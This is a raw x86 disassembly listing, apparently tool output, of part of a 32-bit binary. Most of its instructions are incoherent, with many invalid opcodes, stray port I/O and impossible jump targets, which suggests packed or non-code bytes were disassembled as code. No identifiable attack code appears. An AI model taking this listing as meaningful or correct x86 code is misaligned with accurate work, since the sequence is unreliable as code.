  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
